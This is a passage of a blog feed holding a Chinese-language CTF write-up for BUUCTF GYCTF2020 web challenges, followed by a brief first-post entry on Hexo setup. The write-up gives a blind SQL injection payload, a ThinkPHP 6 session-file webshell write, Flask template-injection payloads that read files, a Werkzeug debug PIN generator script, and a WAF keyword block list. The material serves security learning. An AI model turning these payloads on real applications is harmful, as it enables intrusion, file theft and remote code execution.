alt="image-20210404160645953"></p><p>构造payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>^((select <span class="hljs-number">1</span>,&#x27;f&#x27;)&gt;(select * from f<span class="hljs-number">1</span>ag_<span class="hljs-number">1</span>s_h<span class="hljs-number">3</span>r<span class="hljs-number">3</span>_hhhhh))^<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160225767.png" alt="image-20210404160225767"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160241590.png" alt="image-20210404160241590"></p><p>可见<code>Nu1L</code>页面的上一位就是我们要查询的值.</p><h4 id="Getflag-1"><a href="#Getflag-1" class="headerlink" title="Getflag"></a>Getflag</h4><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160710227.png" alt="image-20210404160710227"></p><p>成功查询到flag。</p><h3 id="WEB-EasyThinking"><a href="#WEB-EasyThinking" class="headerlink" title="[WEB]EasyThinking"></a>[WEB]EasyThinking</h3><h4 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目存在注册，登录，搜索功能，注册后登录搜索测试，发现个人中心会显示搜索记录。根据首页信息：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419105854.png" alt="image-20210419105853980"></p><p>猜测搜索处存在利用点。扫描目录发现存在<code>www.zip</code>，下载源码审计，发现是TP框架，找到功能点核心代码：发现search 处session存储，同时TP是6.0版本：</p><p>参考：<a href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a></p><p>参考：<a href="https://xz.aliyun.com/t/8409">https://xz.aliyun.com/t/8409</a></p><p>TP6session文件存储存在的任意文件操作漏洞，我们可以写入shell，文件路径<code>\runtime\session</code>，文件名为32位就可以，构造后缀为<code>.php</code>的32位字符串，访问<code>sess_</code>+文件名</p><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>从注册的时候开始修改：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419140614.png" alt="image-20210419140614233"></p><p>注册后<code>search</code> 页面 提交key，先写入<code>&lt;?php phpinfo();?&gt;</code></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141031.png" alt="image-20210419141030952"></p><p>然后访问看下：<code>http://xx/runtime/session/sess_b1d19886ab14c0d8340ddf637c17.php</code></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141426.png" alt="image-20210419141426271"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419142246.png" alt="image-20210419142246746"></p><p>写入一句话，蚁剑连接发现执行不了命令，看下phpinfo：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141512.png" alt="image-20210419141512122"></p><p>发现需要bypass disable_functions，php版本为7.3，直接利用蚁剑插件 php7-Backtrace-UAF bypass:</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419145536.png" alt="image-20210419145536851"></p><h3 id="WEB-FlaskApp"><a href="#WEB-FlaskApp" class="headerlink" title="[WEB]FlaskApp"></a>[WEB]FlaskApp</h3><h4 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h4><p>根据题目提示是个flask的base64加密、解密程序，加密结果会在首页显示，还存在一个hint页面：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419150702.png" alt="image-20210419150702201"></p><p>查看源码发现提示<code>PIN</code> 猜测可能是Flask debug Pin码攻击，现在重点就是结合其他漏洞获取必要信息，通过反复测试发现解密的时候输入非base64，识别不了就会报错，同时可以查看部分源码：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419151659.png" alt="image-20210419151659872"></p><p>可以看到如果输入的值解密后能够绕过waf，那么就会执行。那么现在的思路就是构造payload然后base64加密，之后解密执行。</p><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>采用if条件语句防止被过滤：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="hljs-template-variable">&#123;&#123; </span><br><span class="hljs-template-variable">c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;, &#x27;r&#x27;).read()</span><br><span class="hljs-template-variable">&#125;&#125;</span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br><br><span class="xml">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX0NCnslIGlmIGMuX19uYW1lX189PSdjYXRjaF93YXJuaW5ncycgJX0NCnt7IA0KYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywgJ3InKS5yZWFkKCkNCn19DQp7JSBlbmRpZiAlfQ0KeyUgZW5kZm9yICV9</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419154846.png" alt="image-20210419154846170"></p><p>可以得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template_string<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template,request,flash,redirect,url_for<br><span class="hljs-keyword">from</span> flask_wtf <span class="hljs-keyword">import</span> FlaskForm<br><span class="hljs-keyword">from</span> wtforms <span class="hljs-keyword">import</span> StringField, SubmitField<br><span class="hljs-keyword">from</span> wtforms.validators <span class="hljs-keyword">import</span> DataRequired<br><span class="hljs-keyword">from</span> flask_bootstrap <span class="hljs-keyword">import</span> Bootstrap<br><span class="hljs-keyword">import</span> base64<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span><br>bootstrap = Bootstrap(app)<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NameForm</span>(<span class="hljs-params">FlaskForm</span>):</span><br>    text = StringField(<span class="hljs-string">&#x27;BASE64加密&#x27;</span>,validators= [DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;提交&#x27;</span>)<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NameForm1</span>(<span class="hljs-params">FlaskForm</span>):</span><br>    text = StringField(<span class="hljs-string">&#x27;BASE64解密&#x27;</span>,validators= [DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;提交&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    black_list = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;os&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;import&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;chr&quot;</span>,<span class="hljs-string">&quot;request&quot;</span>,<br>                  <span class="hljs-string">&quot;subprocess&quot;</span>,<span class="hljs-string">&quot;commands&quot;</span>,<span class="hljs-string">&quot;socket&quot;</span>,<span class="hljs-string">&quot;hex&quot;</span>,<span class="hljs-string">&quot;base64&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list :<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower() :<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hint</span>():</span><br>    txt = <span class="hljs-string">&quot;失败乃成功之母！！&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;hint.html&quot;</span>,txt = txt)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>():</span><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) :<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64encode(text.encode())<br>        tmp = <span class="hljs-string">&quot;结果  :&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(text_decode.decode()))<br>        res =  render_template_string(tmp)<br>        flash(tmp)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;encode&#x27;</span>))<br>    <span class="hljs-keyword">else</span> :<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,form = form ,method = <span class="hljs-string">&quot;加密&quot;</span> ,img = <span class="hljs-string">&quot;flask.png&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>():</span><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) :<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64decode(text.encode())<br>        tmp = <span class="hljs-string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br>        <span class="hljs-keyword">if</span> waf(tmp) :<br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>        res =  render_template_string(tmp)<br>        flash( res )<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>    <span class="hljs-keyword">else</span> :<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm1(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,form = form, method = <span class="hljs-string">&quot;解密&quot;</span> , img = <span class="hljs-string">&quot;flask1.png&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">not_found</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;404.html&quot;</span>,name = name)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span><br></code></pre></td></tr></table></figure><p>重点在waf：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    black_list = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;os&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;import&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;chr&quot;</span>,<span class="hljs-string">&quot;request&quot;</span>,<br>                  <span class="hljs-string">&quot;subprocess&quot;</span>,<span class="hljs-string">&quot;commands&quot;</span>,<span class="hljs-string">&quot;socket&quot;</span>,<span class="hljs-string">&quot;hex&quot;</span>,<span class="hljs-string">&quot;base64&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list :<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower() :<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>可见过滤了命令执行常用函数，不能采用命令执行的方式。</p><p>继续读一下必要信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">username <span class="hljs-comment">#读取/etc/passwd</span><br><span class="hljs-regexp">//</span>本题：flaskweb<br>modname  <span class="hljs-comment">#flask.app</span><br>getattr(app, <span class="hljs-string">&#x27;__name__&#x27;</span>, getattr(app.__class__, <span class="hljs-string">&#x27;__name__&#x27;</span>))为Flask<br>getattr(mod, <span class="hljs-string">&#x27;__file__&#x27;</span>, None)为flask目录下的一个app.py的绝对路径<br><span class="hljs-regexp">//</span>本题通过报错得到路径：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3.<span class="hljs-number">7</span><span class="hljs-regexp">/site-packages/</span>flask/app.py<br>uuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式<br><span class="hljs-regexp">//</span>获取方式：<span class="hljs-regexp">/sys/</span>class<span class="hljs-regexp">/net/</span>eth0/address<br><span class="hljs-regexp">//</span>本题：<span class="hljs-number">02</span>:<span class="hljs-number">42</span>:ac:<span class="hljs-number">10</span>:af:<span class="hljs-number">49</span> 转化为十进制(python print(<span class="hljs-number">0</span>x0242ac10af49)) <span class="hljs-number">2485377871689</span><br>get_machine_id()<br><span class="hljs-regexp">//</span>读取<span class="hljs-regexp">/etc/m</span>achine-id或者 <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random/boot_i中的值<br><span class="hljs-regexp">//</span>windows读取注册表：SOFTWARE\\Microsoft\\Cryptography<br><span class="hljs-regexp">//</span>docker下：<span class="hljs-regexp">/proc/</span>self/cgroup<br><span class="hljs-regexp">//</span>本题：<span class="hljs-number">0</span>f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8</span><br><span class="hljs-comment"># From https://xz.aliyun.com/t/2553</span><br><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span>,<span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485377871689&#x27;</span>,<span class="hljs-comment">#str(uuid.getnode()), /sys/class/net/ens0/address</span><br>    <span class="hljs-string">&#x27;0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>信息修改完整后运行得到 pin码：<code>410-898-797</code></p><p>读文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>os.listdir(<span class="hljs-string">&#x27;/&#x27;</span>)<br>os.popen(<span class="hljs-string">&#x27;cat /this_is_the_flag.txt&#x27;</span>).readlines()<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419200901.png" alt="image-20210419200900612"></p><p>有大佬直接利用读文件非预期了，我们知道可以读取任意文件，Payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](<span class="hljs-name">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-name">&#x27;/&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419210056.png" alt="image-20210419210055982"></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>&#123;&#123; <br>c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;txt.galf_eht_si_siht/&#x27;</span>[<span class="hljs-symbol">::-1</span>], &#x27;r&#x27;).read()<br>&#125;&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419201816.png" alt="image-20210419201816421"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BUUCTF-GYCTF2020&quot;&gt;&lt;a href=&quot;#BUUCTF-GYCTF2020&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF-GYCTF2020&quot;&gt;&lt;/a&gt;BUUCTF-GYCTF2020&lt;/h2&gt;&lt;h3 id=&quot;WEB-Node-</summary>
      
    
    
    
    <category term="Writeup" scheme="https://v1sun.github.io/categories/Writeup/"/>
    
    
    <category term="buuctf" scheme="https://v1sun.github.io/tags/buuctf/"/>
    
    <category term="Writeup" scheme="https://v1sun.github.io/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>This is the first blog</title>
    <link href="https://v1sun.github.io/2021/04/18/The_first_blog/"/>
    <id>https://v1sun.github.io/2021/04/18/The_first_blog/</id>
    <published>2021-04-18T12:21:57.275Z</published>
    <updated>2021-04-18T15:18:40.240Z</updated>
    
    <content type="html"><![CDATA[<h2 id="This-is-the-first-blog"><a href="#This-is-the-first-blog" class="headerlink" title="This is the first blog"></a>This is the first blog</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>学生时代马上结束了，服务器也到期了</p><p>又回到了刚接触网络安全的时候所采用的的低成本方式：Github+Hexo</p><p>博客用于记录自己的一些学习笔记，方便梳理自己的知识体系，同时也通过写博客来督促自己完成学习任务，减少一些DDL</p><p>去年一年准备各种考试，技术方面落下了不少，正在恶补的同时希望能够继续提升自己</p><p>That’s all………</p><h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>基于对Material Design 风格的热爱，采用<a href="https://hexo.fluid-dev.com/docs/">Fluid</a>主题</p><p>主题 GitHub: <a href="https://github.com/fluid-dev/hexo-theme-fluid">https://github.com/fluid-dev/hexo-theme-fluid</a></p><p>主题文档：<a href="https://hexo.fluid-dev.com/docs/start/">https://hexo.fluid-dev.com/docs/start/</a></p><p>安装方便，Hexo 5.0.0 版本以上，通过 npm 直接安装：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br></code></pre></td></tr></table></figure><p>博客目录下创建<code>_config.fluid.yml</code>文件，copy github的内容，根据自己的需要修改配置。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;This-is-the-first-blog&quot;&gt;&lt;a href=&quot;#This-is-the-first-blog&quot; class=&quot;headerlink&quot; title=&quot;This is the first blog&quot;&gt;&lt;/a&gt;This is the first bl</summary>
      
    
    
    
    
  </entry>
  
</feed>
